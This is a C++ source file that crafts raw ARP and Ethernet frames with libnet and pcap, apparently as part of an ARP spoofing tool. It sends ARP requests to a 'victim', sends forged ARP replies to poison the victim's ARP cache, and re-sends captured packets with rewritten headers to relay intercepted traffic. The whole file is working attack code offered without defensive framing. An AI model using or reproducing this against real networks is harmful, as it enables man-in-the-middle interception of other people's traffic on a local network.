// send_arp.cpp

#include <libnet.h>
#include <pcap.h>
#include <string.h>
#include <stdio.h>

void send_arp(u_char *packet, u_char *s_mac, u_char *d_mac,
		struct in_addr s_ip, struct in_addr d_ip, pcap_t *handle, 
		struct pcap_pkthdr *header, int flag)
{
	struct libnet_ethernet_hdr *eth_hdr;	//ethernet header
	struct libnet_arp_hdr *arp_hdr;		//arp hedaer
	const int packet_size = 42;
	char buf[INET_ADDRSTRLEN];			//For d_ip address

	eth_hdr = (struct libnet_ethernet_hdr *)malloc(sizeof(struct libnet_ethernet_hdr));
	arp_hdr = (struct libnet_arp_hdr *)malloc(sizeof(struct libnet_arp_hdr));

	if(flag == 1)					//ARP REQUEST
	{	
		memset(packet, 0, packet_size);		//initiallize the packet memory with 0's

		for (int i = 0; i < 6; i++)
		{
			eth_hdr -> ether_dhost[i] = 0xff;	//For broadcasting
			eth_hdr -> ether_shost[i] = s_mac[i];
		}
	
		eth_hdr -> ether_type = htons(ETHERTYPE_ARP);	//ARP protocol, ETHERTYPE_ARP = 0x0806
		memcpy(packet, (u_char *)eth_hdr, LIBNET_ETH_H);	//ethernet header

		arp_hdr -> ar_hrd = htons(ARPHRD_ETHER);	//ARPHRD_ETHER = 1
		arp_hdr -> ar_pro = htons(ETHERTYPE_IP);	//0x0800 (IPv4)
		arp_hdr -> ar_hln = 0x06;			//header size
		arp_hdr -> ar_pln = 0x04;			//protocol size
		arp_hdr -> ar_op = htons(ARPOP_REQUEST);	//ARPOP_REQUEST = 1

		memcpy(packet + LIBNET_ETH_H, (u_char *)arp_hdr, 8);	//Copy arp header data into the packet
		memcpy(packet + 22, s_mac, ETHER_ADDR_LEN);	//Source MAC address
		memcpy(packet + 28, &s_ip.s_addr, 4);		//Source IP address
		memset(packet + 32, 0x00, ETHER_ADDR_LEN);	//We don't know the MAC address yet
		memcpy(packet + 38, &d_ip.s_addr, 4);		//Victim's IP address

		pcap_sendpacket(handle, packet, packet_size);	//Send ARP request packet
	}

	else if (flag == 2)					//ARP_REPLY
	{
		//Change the ethernet destination host from broadcast to victim's mac address
		for(int i = 0; i < 6; i++)
		{
			eth_hdr -> ether_dhost[i] = d_mac[i];	
			eth_hdr -> ether_shost[i] = s_mac[i];
		}
		eth_hdr -> ether_type = htons(ETHERTYPE_ARP);	//ARP protocol, ETHERTYPE_ARP = 0x0806
		//Change the operation from request to reply
		arp_hdr -> ar_hrd = htons(ARPHRD_ETHER);	//ARPHRD_ETHER = 1
		arp_hdr -> ar_pro = htons(ETHERTYPE_IP);	//0x0800 (IPv4)
		arp_hdr -> ar_hln = 0x06;			//header size
		arp_hdr -> ar_pln = 0x04;			//protocol size
		arp_hdr -> ar_op = htons(ARPOP_REPLY);		
		
		memcpy(packet, (u_char *)eth_hdr, LIBNET_ETH_H); 
		memcpy(packet + LIBNET_ETH_H, (u_char *)arp_hdr, 8);
		memcpy(packet + 22, s_mac, ETHER_ADDR_LEN);
		memcpy(packet + 28, &s_ip.s_addr, 4);
		memcpy(packet + 32, d_mac, ETHER_ADDR_LEN);
		memcpy(packet + 38, &d_ip.s_addr, 4);		//Victim's IP address
		
		printf("Sender IP address: %s\n\n", inet_ntop(AF_INET, &d_ip, buf, sizeof(buf)));

		pcap_sendpacket(handle, packet, packet_size);
	}

	else if (flag == 3)					//ARP_REPLY
	{
		//Change the ethernet destination host from broadcast to victim's mac address
		for(int i = 0; i < 6; i++)
		{
			eth_hdr -> ether_dhost[i] = d_mac[i];	
			eth_hdr -> ether_shost[i] = s_mac[i];
		}

		eth_hdr -> ether_type = htons(ETHERTYPE_IP);	//ARP protocol, ETHERTYPE_ARP = 0x0806
		
		memcpy(packet, (u_char *)eth_hdr, LIBNET_ETH_H); 

		pcap_sendpacket(handle, packet, header -> len);
	}


	free(eth_hdr);
	free(arp_hdr);
}
